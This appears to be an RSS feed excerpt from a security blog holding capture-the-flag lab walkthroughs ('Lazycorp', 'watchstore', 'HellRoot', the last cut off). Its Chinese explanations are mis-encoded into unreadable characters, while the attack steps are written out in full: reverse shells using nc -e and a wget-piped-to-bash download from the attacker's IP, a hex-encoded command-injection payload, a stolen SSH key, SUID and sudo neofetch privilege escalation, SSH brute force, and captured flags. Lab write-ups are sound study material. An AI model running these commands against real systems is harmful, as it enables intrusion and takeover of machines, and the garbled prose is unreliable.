    ‚îî‚îÄ$ nc -lvnp 8888
    ```
4.  ËÆøÈóÆ‰∏ä‰º†ÂêéÁöÑshellÊñá‰ª∂ `http://192.168.205.149/auth-lazycorp-dev/uploads/reverse.php`ÔºåËß¶ÂèëÂèçÂºπ„ÄÇ

```shell
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.149] 37494
Linux arvindlazycorp 5.4.0-216-generic ...
...
www-data@arvindlazycorp:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

ÊàêÂäüËé∑Âèñ‰∫Ü‰∏Ä‰∏™ `www-data` Áî®Êà∑ÁöÑshell„ÄÇ

# **‰∏â„ÄÅÊùÉÈôêÊèêÂçá**

## **Ê®™ÂêëÁßªÂä®Ôºöwww-data -&gt; arvind**

Ëé∑ÂèñÂàùÂßãshellÂêéÔºåÈ¶ñÂÖàËøõË°å‰ø°ÊÅØÊî∂ÈõÜ„ÄÇÂú® `/home/arvind/` ÁõÆÂΩï‰∏ãÔºåÂèëÁé∞‰∫Ü‰∏Ä‰∏™ `.ssh` ÁõÆÂΩïÔºåÂÖ∂‰∏≠ÂåÖÂê´SSHÁßÅÈí• `id_rsa`„ÄÇ

```shell
www-data@arvindlazycorp:/$ cd /home/arvind/.ssh
www-data@arvindlazycorp:/home/arvind/.ssh$ ls -al
total 20
drwxr-xr-x 2 arvind arvind 4096 Jul  9 07:37 .
drwxr-xr-x 5 arvind arvind 4096 Jul 16 12:49 ..
-rw------- 1 arvind arvind  747 Jul  9 07:47 authorized_keys
-rw-r--r-- 1 arvind arvind 3389 Jul  9 07:37 id_rsa
-rw-r--r-- 1 arvind arvind  747 Jul  9 07:37 id_rsa.pub
```

Âà©Áî®Ëøô‰∏™ÁßÅÈí•ÔºåÂèØ‰ª•Áõ¥Êé•‰ª• `arvind` Áî®Êà∑ÁöÑË∫´‰ªΩÁôªÂΩïSSH„ÄÇ

```shell
www-data@arvindlazycorp:/home/arvind/.ssh$ ssh arvind@127.0.0.1 -i id_rsa
...
Welcome to Ubuntu 20.04.6 LTS ...
arvind@arvindlazycorp:~$ id
uid=1000(arvind) gid=1000(arvind) groups=1000(arvind),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),117(lxd)
```

ÊàêÂäüÂàáÊç¢Âà∞ `arvind` Áî®Êà∑„ÄÇ

## **ÂûÇÁõ¥ÊèêÊùÉÔºöarvind -&gt; root**

Âú® `arvind` ÁöÑÂÆ∂ÁõÆÂΩï‰∏≠ÔºåÂèëÁé∞‰∫Ü‰∏Ä‰∏™ÂÖ∑ÊúâSUIDÊùÉÈôêÁöÑÂèØÊâßË°åÊñá‰ª∂ `reset`„ÄÇ

```shell
arvind@arvindlazycorp:~$ ls -al
...
-rwsr-xr-x 1 root   root   16744 Jul 16 12:22 reset
...
```

SUIDÊòØ‰∏ÄÁßçÁâπÊÆäÁöÑÊñá‰ª∂ÊùÉÈôêÔºåÂÆÉÂÖÅËÆ∏Áî®Êà∑Âú®ÊâßË°åËØ•Êñá‰ª∂Êó∂Ôºå‰∏¥Êó∂Ëé∑ÂæóÊñá‰ª∂ÊâÄÊúâËÄÖÔºàÂú®ËøôÈáåÊòØrootÔºâÁöÑÊùÉÈôê„ÄÇ

‰ΩøÁî® `strings` ÂëΩ‰ª§ÂàÜÊûêËØ•Êñá‰ª∂ÔºåÊü•ÊâæÂÖ∂ÂäüËÉΩ„ÄÇ

```shell
arvind@arvindlazycorp:~$ strings ./reset
...
/usr/bin/reset_site.sh
...
```

ÂàÜÊûêÁªìÊûúÊòæÁ§∫ÔºåËØ•Á®ãÂ∫è‰ºöË∞ÉÁî® `/usr/bin/reset_site.sh` ËÑöÊú¨„ÄÇÊ£ÄÊü•ËØ•ËÑöÊú¨ÁöÑÊùÉÈôê„ÄÇ

```shell
arvind@arvindlazycorp:~$ ls -la /usr/bin/reset_site.sh
-rwxrwxr-x 1 root arvind 254 Jul  9 10:26 /usr/bin/reset_site.sh
```

Êàë‰ª¨ÂèëÁé∞ÔºåÂΩìÂâçÁî®Êà∑ `arvind` ÂØπËøô‰∏™ËÑöÊú¨ÊúâÂÜôÂÖ•ÊùÉÈôê„ÄÇËøôÊòØ‰∏Ä‰∏™ÂÖ∏ÂûãÁöÑSUIDÊèêÊùÉÊºèÊ¥û„ÄÇÊàë‰ª¨ÂèØ‰ª•ÈÄöËøá‰øÆÊîπËØ•ËÑöÊú¨ÂÜÖÂÆπÔºåËÆ© `reset` Á®ãÂ∫èÂú®‰ª•rootÊùÉÈôêÊâßË°åÊó∂ÔºåËøêË°åÊàë‰ª¨Ëá™ÂÆö‰πâÁöÑÂëΩ‰ª§„ÄÇ

1.  Â∞ÜÊèêÊùÉÂëΩ‰ª§ÂÜôÂÖ•ËÑöÊú¨ÔºåËøôÈáåÊàë‰ª¨Â∞Ü‰∏∫ `/bin/bash` Ê∑ªÂä†SUID‰Ωç„ÄÇ
    ```shell
    arvind@arvindlazycorp:~$ echo 'chmod +s /bin/bash' &gt; /usr/bin/reset_site.sh
    ```
2.  ÊâßË°åSUIDÁ®ãÂ∫è `reset` Êù•Ëß¶ÂèëÊàë‰ª¨ÂÜôÂÖ•ÁöÑÊÅ∂ÊÑèÂëΩ‰ª§„ÄÇ
    ```shell
    arvind@arvindlazycorp:~$ ./reset
    ```
3.  Ê£ÄÊü• `/bin/bash` ÁöÑÊùÉÈôêÔºåÂèëÁé∞Â∑≤ÊàêÂäüËÆæÁΩÆSUID‰Ωç„ÄÇ
    ```shell
    arvind@arvindlazycorp:~$ ls -al /bin/bash
    -rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
    ```
4.  ‰ΩøÁî® `-p` ÂèÇÊï∞ËøêË°å `bash`Ôºå‰ª•‰øùÁïôSUIDËµã‰∫àÁöÑÊúâÊïàÁî®Êà∑IDÔºàeuidÔºâÔºå‰ªéËÄåËé∑ÂæórootÊùÉÈôêÁöÑshell„ÄÇ
    ```shell
    arvind@arvindlazycorp:~$ bash -p
    bash-5.0# id
    uid=1000(arvind) gid=1000(arvind) euid=0(root) egid=0(root) groups=...
    ```

ÊàêÂäüÊèêÂçáËá≥rootÊùÉÈôê„ÄÇ

# **Âõõ„ÄÅËé∑ÂèñFlag**

Áé∞Âú®ÔºåÊàë‰ª¨Êã•Êúâ‰∫ÜÁ≥ªÁªüÁöÑÊúÄÈ´òÊùÉÈôêÔºåÂèØ‰ª•ËØªÂèñÊâÄÊúâflagÊñá‰ª∂„ÄÇ

```shell
bash-5.0# cat /root/root.txt /home/arvind/user.txt
FLAG{lazycorp_reset_exploit_worked}
FLAG{you_got_foothold_nice}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Lazzycorp.html</guid><pubDate>Tue, 19 Aug 2025 14:51:41 +0000</pubDate></item><item><title>thl_watchstore</title><link>https://7r1UMPHK.github.io/post/thl_watchstore.html</link><description># **‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ**

## **1.1 ‰∏ªÊú∫ÂèëÁé∞**

È¶ñÂÖàÔºåÂú®ÂΩìÂâçÁΩëÊÆµ‰∏≠‰ΩøÁî® `arp-scan` ËøõË°å‰∏ªÊú∫ÂèëÁé∞ÔºåÁ°ÆÂÆöÁõÆÊ†á‰∏ªÊú∫ÁöÑIPÂú∞ÂùÄ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l       
...
192.168.205.152 08:00:27:e0:02:1a       PCS Systemtechnik GmbH
...
```

Êâ´ÊèèÁªìÊûúË°®ÊòéÔºåÁõÆÊ†á‰∏ªÊú∫ÁöÑIPÂú∞ÂùÄ‰∏∫ `192.168.205.152`„ÄÇ

## **1.2 Á´ØÂè£Êâ´Êèè**

‰ΩøÁî® `nmap` ÂØπÁõÆÊ†á‰∏ªÊú∫ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºå‰ª•ËØÜÂà´ÂºÄÊîæÁöÑÁ´ØÂè£ÂíåÊúçÂä°„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p0-65535 192.168.205.152
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-18 07:42 EDT
Nmap scan report for watchstore.thl (192.168.205.152)
Host is up (0.00026s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
MAC Address: 08:00:27:E0:02:1A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
...
```

Êâ´ÊèèÂèëÁé∞‰∏ªÊú∫ÂºÄÊîæ‰∫Ü `22` (SSH) Âíå `8080` (http-proxy) ‰∏§‰∏™Á´ØÂè£„ÄÇËÆøÈóÆ8080Á´ØÂè£ÁöÑWebÊúçÂä°Êó∂ÔºåÈ°µÈù¢Ë∑≥ËΩ¨Âà∞‰∫ÜÂüüÂêç `watchstore.thl`„ÄÇ

## **1.3 Êú¨Âú∞DNSËß£ÊûêÈÖçÁΩÆ**

‰∏∫‰∫ÜÊ≠£Â∏∏ËÆøÈóÆËØ•ÁΩëÁ´ôÔºåÈúÄË¶ÅÂ∞ÜÂüüÂêç‰∏éIPÂú∞ÂùÄÁöÑÊò†Â∞ÑÂÖ≥Á≥ªÊ∑ªÂä†Âà∞Êú¨Âú∞ÁöÑ `/etc/hosts` Êñá‰ª∂‰∏≠„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ tail -n 1 /etc/hosts
192.168.205.152 watchstore.thl
```

## **1.4 WebÁõÆÂΩïÊâ´Êèè**

ÈÖçÁΩÆÂ•ΩhostsÂêéÔºå‰ΩøÁî® `gobuster` ÂØπÁΩëÁ´ôËøõË°åÁõÆÂΩïÊâ´ÊèèÔºåÂØªÊâæÈöêËóèÁöÑË∑ØÂæÑÊàñÂäüËÉΩÁÇπ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ gobuster dir -u http://watchstore.thl:8080/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64
===============================================================
...
===============================================================
/products             (Status: 200) [Size: 772]
/read                 (Status: 500) [Size: 13133]
/console              (Status: 200) [Size: 1563]
...
```

Êâ´ÊèèÂèëÁé∞‰∫ÜÂá†‰∏™ÂÖ≥ÈîÆË∑ØÂæÑÔºåÂÖ∂‰∏≠ `/read` ËøîÂõû‰∫Ü500ÈîôËØØÔºå`/console` È°µÈù¢‰ºº‰πéÊòØ‰∏Ä‰∏™ÊéßÂà∂Âè∞„ÄÇ

# **‰∫å„ÄÅÊºèÊ¥ûÊåñÊéò‰∏éÂà©Áî®**

## **2.1 WerkzeugË∞ÉËØïÂô®‰ø°ÊÅØÊ≥ÑÈú≤**

Áõ¥Êé•ËÆøÈóÆ `/read` Ë∑ØÂæÑÔºåÊúçÂä°Âô®ËøîÂõû‰∫Ü‰∏Ä‰∏™ËØ¶ÁªÜÁöÑÈîôËØØÈ°µÈù¢„ÄÇËøôÊòØ‰∏Ä‰∏™Áî± Werkzeug ÂêØÂä®ÁöÑË∞ÉËØïÂô®ÁïåÈù¢ÔºåÈÄöÂ∏∏Âú®ÂºÄÂèëÁéØÂ¢É‰∏≠Âá∫Áé∞ÔºåÂΩìWebÂ∫îÁî®Âú®Ë∞ÉËØïÊ®°ÂºèÔºàDebug ModeÔºâ‰∏ãËøêË°åÊó∂ÔºåËã•Á®ãÂ∫èÂá∫Áé∞Êú™Ë¢´ÊçïËé∑ÁöÑÂºÇÂ∏∏ÔºåÂ∞±‰ºöÂ±ïÁ§∫ËØ•È°µÈù¢„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl 'http://watchstore.thl:8080/read'
...
&lt;h1&gt;Exception&lt;/h1&gt;
&lt;div class='detail'&gt;
  &lt;p class='errormsg'&gt;Exception: Falta el par√°metro &amp;#x27;id&amp;#x27;
&lt;/p&gt;
&lt;/div&gt;
&lt;h2 class='traceback'&gt;Traceback &lt;em&gt;(most recent call last)&lt;/em&gt;&lt;/h2&gt;
...
  &lt;h4&gt;File &lt;cite class='filename'&gt;'/home/relox/watchstore/app.py'&lt;/cite&gt;,
      line &lt;em class='line'&gt;65&lt;/em&gt;,
      in &lt;code class='function'&gt;read_file&lt;/code&gt;&lt;/h4&gt;
...
  &lt;blockquote&gt;Exception: Falta el par√°metro 'id'
&lt;/blockquote&gt;
...
```

Ëøô‰∏™Êä•ÈîôÈ°µÈù¢Ê≥ÑÈú≤‰∫Ü‰ª•‰∏ãÂÖ≥ÈîÆ‰ø°ÊÅØÔºö
1.  **ÈîôËØØÂéüÂõ†**ÔºöÊèêÁ§∫ 'Falta el par√°metro 'id''ÔºåËØ¥Êòé `/read` Ë∑ØÁî±ÈúÄË¶Å‰∏Ä‰∏™Âêç‰∏∫ `id` ÁöÑÂèÇÊï∞„ÄÇ
2.  **ÁªùÂØπË∑ØÂæÑ**ÔºöÊö¥Èú≤‰∫ÜÂ∫îÁî®Á®ãÂ∫èÁöÑÁªùÂØπË∑ØÂæÑ `/home/relox/watchstore/app.py`„ÄÇ
3.  **ÊºèÊ¥ûÁ±ªÂûã**Ôºö‰ªéÂáΩÊï∞Âêç `read_file` ÂíåÂèÇÊï∞ `id` Êé®Êñ≠ÔºåËøôÈáåÂèØËÉΩÂ≠òÂú®‰ªªÊÑèÊñá‰ª∂ËØªÂèñÔºàLFIÔºâÊºèÊ¥û„ÄÇ
4.  **Ë∞ÉËØïÊéßÂà∂Âè∞**ÔºöWerkzeugË∞ÉËØïÂô®ÈÄöÂ∏∏ÂåÖÂê´‰∏Ä‰∏™‰∫§‰∫íÂºèÊéßÂà∂Âè∞ÔºåÂèØ‰ª•ÈÄöËøá PIN Á†ÅËß£ÈîÅÂêéÊâßË°å‰ªªÊÑèPython‰ª£Á†Å„ÄÇ

## **2.2 ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥ûÂà©Áî®**

Âà©Áî®‰∏ä‰∏ÄÊ≠•ÂèëÁé∞ÁöÑLFIÊºèÊ¥ûÂíåÊ≥ÑÈú≤ÁöÑÁªùÂØπË∑ØÂæÑÔºåÂ∞ùËØïËØªÂèñ `app.py` Êñá‰ª∂ÁöÑÊ∫ê‰ª£Á†Å„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl 'http://watchstore.thl:8080/read?id=/home/relox/watchstore/app.py'

&lt;pre&gt;import os
os.environ['WERKZEUG_DEBUG_PIN'] = '612-791-734'

from flask import Flask, render_template, request, abort, redirect
...
@app.route('/read')
def read_file():
    filepath = request.args.get('id')
    if not filepath:
        raise Exception('Falta el par√°metro 'id'')  # Esto mostrar√° el traceback
    try:
        with open(filepath, 'r') as f:
            content = f.read()
    except Exception as e:
        content = f'No se pudo leer el archivo: {e}'
    return f'&lt;pre&gt;{content}&lt;/pre&gt;'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)
&lt;/pre&gt;
```

ÊàêÂäüËØªÂèñÂà∞ `app.py` ÁöÑÊ∫ê‰ª£Á†Å„ÄÇ‰ª£Á†Å‰∏≠ÊòéÁ°ÆÊåáÂá∫‰∫Ü `debug=True`ÔºåÂπ∂‰∏îÁ°¨ÁºñÁ†Å‰∫Ü **Werkzeug Ë∞ÉËØïÂô®ÁöÑPINÁ†ÅÔºö`612-791-734`**„ÄÇ

## **2.3 Ëé∑ÂèñÂèçÂêëShell**

Êúâ‰∫ÜPINÁ†ÅÔºåÂ∞±ÂèØ‰ª•Âà©Áî®‰πãÂâçÂèëÁé∞ÁöÑ `/console` Ë∑ØÂæÑÊù•ÊâßË°å‰ªªÊÑè‰ª£Á†Å„ÄÇ

1.  ËÆøÈóÆ `http://watchstore.thl:8080/console`„ÄÇ
2.  Âú®PINÁ†ÅËæìÂÖ•Ê°Ü‰∏≠ËæìÂÖ• `612-791-734` Ëß£ÈîÅÊéßÂà∂Âè∞„ÄÇ
3.  Âú®ÊéßÂà∂Âè∞‰∏≠ËæìÂÖ•ÂèØ‰ª•ÂèçÂºπshellÁöÑPython‰ª£Á†Å„ÄÇËøôÈáå‰ΩøÁî® `wget` ‰∏ãËΩΩÂπ∂ÊâßË°åËøúÁ®ãËÑöÊú¨ÁöÑÊñπÂºè„ÄÇ

```python
import os
os.system('busybox wget 192.168.205.128/reverse.sh -O - | bash')
```

ÊâßË°åÂêéÔºåÂú®Êú¨Âú∞ÁõëÂê¨ÁöÑÁ´ØÂè£ÊàêÂäüÊé•Êî∂Âà∞Êù•Ëá™ÁõÆÊ†áÊúçÂä°Âô®ÁöÑshell„ÄÇ

# **‰∏â„ÄÅÊùÉÈôêÊèêÂçá**

## **3.1 ÂàùÊ≠•Á´ãË∂≥‰∏é‰ø°ÊÅØÊî∂ÈõÜ**

Ëé∑ÂèñÂàùÂßãshellÂêéÔºåËøõË°åÁÆÄÂçïÁöÑÁéØÂ¢ÉÈÖçÁΩÆÂíå‰ø°ÊÅØÊî∂ÈõÜ„ÄÇ

```bash
# Á®≥ÂÆöshell
relox@thehackerslabs-watchstore:~/watchstore$ export TERM=xterm
relox@thehackerslabs-watchstore:~/watchstore$ export SHELL=/bin/bash
relox@thehackerslabs-watchstore:~/watchstore$ stty rows 24 columns 80

# Êü•ÁúãÂΩìÂâçÁõÆÂΩïÂíå‰∏äÁ∫ßÁõÆÂΩï
relox@thehackerslabs-watchstore:~/watchstore$ ls -al
...
-rw-r--r-- 1 relox relox 2212 jun 16 10:57 app.py
...
relox@thehackerslabs-watchstore:~$ ls -al
...
-rw-r--r-- 1 relox relox   33 jun 16 11:10 user.txt
...

# ËØªÂèñuser flag
relox@thehackerslabs-watchstore:~$ cat user.txt 
43209bbbe021f88cf1a53b9e5da8a
```

Êé•‰∏ãÊù•Ôºå‰ΩøÁî® `sudo -l` ÂëΩ‰ª§Ê£ÄÊü•ÂΩìÂâçÁî®Êà∑ `relox` ÁöÑ `sudo` ÊùÉÈôê„ÄÇ

```bash
relox@thehackerslabs-watchstore:~$ sudo -l
...
User relox may run the following commands on thehackerslabs-watchstore:
    (root) NOPASSWD: /usr/bin/neofetch
```

ÁªìÊûúÊòæÁ§∫Ôºå`relox` Áî®Êà∑ÂèØ‰ª•Êó†ÈúÄÂØÜÁ†Å‰ª• `root` Ë∫´‰ªΩÊâßË°å `/usr/bin/neofetch` ÂëΩ‰ª§„ÄÇ

## **3.2 Âà©Áî® neofetch Sudo ÊèêÊùÉ**

Êü•ËØ¢ [GTFOBins](https://gtfobins.github.io/gtfobins/neofetch/#sudo) ÂèØÁü•Ôºå`neofetch` ÂèØ‰ª•ÈÄöËøá `--config` ÂèÇÊï∞Âä†ËΩΩ‰∏Ä‰∏™Ëá™ÂÆö‰πâÈÖçÁΩÆÊñá‰ª∂„ÄÇÂ¶ÇÊûúËøô‰∏™ÈÖçÁΩÆÊñá‰ª∂‰∏≠ÁöÑÂÜÖÂÆπÊòØÂèØÊâßË°åÁöÑÂëΩ‰ª§Ôºå`neofetch` ‰ºöÂú®ÂêØÂä®Êó∂ÊâßË°åÂÆÉ„ÄÇ

Âà©Áî®Ê≠§ÁâπÊÄßÔºåÂèØ‰ª•ÊûÑÈÄ†‰∏Ä‰∏™ÊÅ∂ÊÑèÁöÑÈÖçÁΩÆÊñá‰ª∂Êù•Ëé∑Âèñ `root` shell„ÄÇ

1.  ÂàõÂª∫‰∏Ä‰∏™Êñá‰ª∂ÔºåÂÜÖÂÆπ‰∏∫ÊâßË°å `/bin/bash`„ÄÇ

    ```bash
    relox@thehackerslabs-watchstore:~$ echo 'exec /bin/bash' &gt; shell_config
    ```

2.  ‰ΩøÁî® `sudo` Âíå `--config` ÂèÇÊï∞ÊåáÂÆöËØ•Êñá‰ª∂Êù•ËøêË°å `neofetch`„ÄÇ

    ```bash
    relox@thehackerslabs-watchstore:~$ sudo /usr/bin/neofetch --config shell_config
    ```

ÂëΩ‰ª§ÊâßË°åÂêéÔºåÊàêÂäüËé∑Âæó‰∫Ü `root` ÊùÉÈôêÁöÑshell„ÄÇ

## **3.3 Ëé∑Âèñ Root Flag**

ÊúÄÂêéÔºåËØªÂèñ `/root` ÁõÆÂΩï‰∏ãÁöÑ `root.txt` Êñá‰ª∂ÔºåÂÆåÊàêÊèêÊùÉ„ÄÇ

```bash
root@thehackerslabs-watchstore:/home/relox# cat /root/root.txt 
c3ab266a11de0294257eaef3571bdf37
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/thl_watchstore.html</guid><pubDate>Mon, 18 Aug 2025 11:49:27 +0000</pubDate></item><item><title>thl_HellRoot</title><link>https://7r1UMPHK.github.io/post/thl_HellRoot.html</link><description># **‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ**

È¶ñÂÖàÔºåÂØπÁõÆÊ†áÁΩëÊÆµËøõË°å‰∏ªÊú∫ÂèëÁé∞„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.144 08:00:27:d0:16:be       PCS Systemtechnik GmbH
...
```

Á°ÆÂÆöÁõÆÊ†á‰∏ªÊú∫IP‰∏∫ `192.168.205.144` ÂêéÔºåÂØπÂÖ∂ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºåÂèëÁé∞ÂºÄÊîæ‰∫ÜÂ§ö‰∏™ÊúçÂä°„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p0-65535 192.168.205.144
...
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
222/tcp  open  rsh-spx
443/tcp  open  https
5000/tcp open  upnp
...
```

# **‰∫å„ÄÅÊç∑ÂæÑÔºöSSHÁàÜÁ†¥**

Âú®Ê∑±ÂÖ•Êé¢Á¥¢‰πãÂâçÔºåÂèëÁé∞‰∫Ü‰∏Ä‰∏™ÊûÅÂÖ∂ÁÆÄÂçïÁöÑÊèêÊùÉË∑ØÂæÑ„ÄÇÈÄöËøáÂØπSSHÊúçÂä°ËøõË°åÂº±Âè£‰ª§ÁàÜÁ†¥ÔºåÂèØ‰ª•ËøÖÈÄüËé∑ÂæórootÊùÉÈôê„ÄÇ

ÂáÜÂ§á‰∏Ä‰∏™ÁÆÄÂçïÁöÑÁî®Êà∑Â≠óÂÖ∏Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ echo 'root\nadmin\n' &gt; user
```

‰ΩøÁî®`hydra`Â∑•ÂÖ∑Âíå‰∏Ä‰∏™Â∏∏Áî®ÂØÜÁ†ÅÂ≠óÂÖ∏ÔºàÊ≠§Â§Ñ‰∏∫`5000q.txt`ÔºâËøõË°åÁàÜÁ†¥Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ hydra -L user -P 5000q.txt ssh://192.168.205.144 -f -I -u -e nsr -t 64 
...
[22][ssh] host: 192.168.205.144   login: root   password: 12345
...
```

ÊàêÂäüÁàÜÁ†¥Âá∫rootÁî®Êà∑ÁöÑÂØÜÁ†Å‰∏∫ `12345`„ÄÇÁõ¥Êé•ÁôªÂΩïÂç≥ÂèØÂÆåÊàêÈù∂Êú∫„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ ssh root@192.168.205.144
...
root@hellroot:~# cat /home/astro/user.txt /root/root.txt 
f220dcf45ccfc10c4c44ea8c413186f2
f039facf1ae0d69b07484df1c4da32df
```

# **‰∏â„ÄÅÂ∏∏ËßÑË∑ØÂæÑÔºöWebÊ∏óÈÄè**

Êé•‰∏ãÊù•ÔºåÊàë‰ª¨Êé¢Á¥¢È¢ÑËÆæÁöÑ„ÄÅÊõ¥ÂÖ∑ÊåëÊàòÊÄßÁöÑÊîªÂáªË∑ØÂæÑ„ÄÇ

## **1. Gitea‰ª£Á†ÅÂÆ°ËÆ°**

ËÆøÈóÆÁõÆÊ†á80Á´ØÂè£ÔºåÈ°µÈù¢‰∏∫ApacheÈªòËÆ§È°µÔºåÊó†ÂèØÁî®‰ø°ÊÅØ„ÄÇËÆøÈóÆ443Á´ØÂè£ÔºåÂèëÁé∞È°µÈù¢Ë∑≥ËΩ¨Ëá≥ `git.hellroot.thl`„ÄÇÊàë‰ª¨Â∞ÜÊ≠§ÂüüÂêç‰∏éÁõÆÊ†áIPÁªëÂÆöÂà∞ `/etc/hosts` Êñá‰ª∂‰∏≠„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ tail -n 1 /etc/hosts
192.168.205.144 git.hellroot.thl
```

ÈáçÊñ∞ËÆøÈóÆ `https://git.hellroot.thl`ÔºåÂèëÁé∞ÊòØ‰∏Ä‰∏™ Gitea ÊúçÂä°ÔºàÁâàÊú¨1.24.3Ôºâ„ÄÇÂÖ∂‰∏≠Â≠òÂú®‰∏Ä‰∏™Âêç‰∏∫ `Astro/hellroot.thl` ÁöÑÂÖ¨ÂºÄ‰ª£Á†Å‰ªìÂ∫ì„ÄÇ

Âú®‰ªìÂ∫ìÁöÑ `Dockerfile` Êñá‰ª∂‰∏≠ÔºåÂèëÁé∞‰∫Ü‰∏ÄÁªÑÂá≠ÊçÆÔºö`astro:iloveastro`„ÄÇ

Âú® `index.php` Êñá‰ª∂‰∏≠ÔºåÊàë‰ª¨ÂÆ°ËÆ°Âà∞‰∏ÄÊÆµÂ≠òÂú®ÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÁöÑ‰ª£Á†Å„ÄÇËØ•‰ª£Á†ÅËøêË°åÂú®5000Á´ØÂè£„ÄÇ

```php
&lt;?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' &amp;&amp; !empty($_POST['domain'])) {
    $input = trim($_POST['domain']);
    $decoded = @hex2bin($input);

    // ...

    if ($decoded !== false &amp;&amp; ctype_print($decoded)) {
        if (strpos($decoded, ';') !== false) {
            // Remove header modification that breaks execution
            $output = shell_exec($decoded . ' 2&gt;&amp;1'); // Â≠òÂú®ÂëΩ‰ª§Ê≥®ÂÖ•
        } else {
            $safeDomain = escapeshellarg($decoded);
            $output = shell_exec('nslookup $safeDomain 2&gt;&amp;1');
        }
    } else {
        // ...
    }
    // ...
}
?&gt;
```

‰ª£Á†ÅÈÄªËæëÊòæÁ§∫ÔºåÂ¶ÇÊûúPOSTËØ∑Ê±ÇÁöÑ`domain`ÂèÇÊï∞ÁªèËøáÂçÅÂÖ≠ËøõÂà∂Ëß£Á†ÅÂêéÂåÖÂê´ÂàÜÂè∑`;`ÔºåÂàô‰ºöÁõ¥Êé•ÊãºÊé•Âà∞`shell_exec`ÂáΩÊï∞‰∏≠ÊâßË°åÔºåÈÄ†ÊàêËøúÁ®ãÂëΩ‰ª§ÊâßË°åÔºàRCEÔºâÊºèÊ¥û„ÄÇ

## **2. RCEÊºèÊ¥ûÂà©Áî®**

Êàë‰ª¨ÂèØ‰ª•Â∞Ü‰ªªÊÑèÂëΩ‰ª§ËΩ¨Êç¢‰∏∫ÂçÅÂÖ≠ËøõÂà∂Â≠óÁ¨¶‰∏≤Êù•ÁªïËøáËøáÊª§Âπ∂ÊâßË°å„ÄÇÈ¶ñÂÖàÔºåÊµãËØï`id;`ÂëΩ‰ª§ÔºåÂÖ∂ÂçÅÂÖ≠ËøõÂà∂‰∏∫`69643b`„ÄÇÂú®5000Á´ØÂè£ÁöÑÊúçÂä°‰∏äÊèê‰∫§ËØ•payloadÔºåÊàêÂäüÊâßË°å„ÄÇ

‰∏∫‰∫ÜËé∑Âèñ‰∏Ä‰∏™‰∫§‰∫íÂºèShellÔºåÊàë‰ª¨ÊûÑÈÄ†‰∏Ä‰∏™ÂèçÂºπShellÁöÑpayload„ÄÇÁõÆÊ†á‰∏ªÊú∫Â≠òÂú®`nc`ÔºåÂõ†Ê≠§‰ΩøÁî®`nc`ËøõË°åÂèçÂºπ„ÄÇ

**Payload**: `nc 192.168.205.128 8888 -e /bin/bash;`
**HexÁºñÁ†Å**: `6e63203139322e3136382e3230352e3132382038383838202d65202f62696e2f626173683b`

Âú®Kali‰∏äÂºÄÂêØÁõëÂê¨ÔºåÂπ∂Êèê‰∫§‰∏äËø∞PayloadÔºåÊàêÂäüÊé•Êî∂Âà∞ÂèçÂºπShell„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nc -lvnp 8888                 
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.144] 59278
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

ÂΩìÂâçÁî®Êà∑‰∏∫ `www-data`ÔºåËøôÊòØ‰∏Ä‰∏™DockerÂÆπÂô®ÂÜÖÁöÑ‰ΩéÊùÉÈôêÁî®Êà∑„ÄÇ

# **Âõõ„ÄÅDockerÂÜÖÊèêÊùÉ‰∏éÊµÅÈáèÂóÖÊé¢**

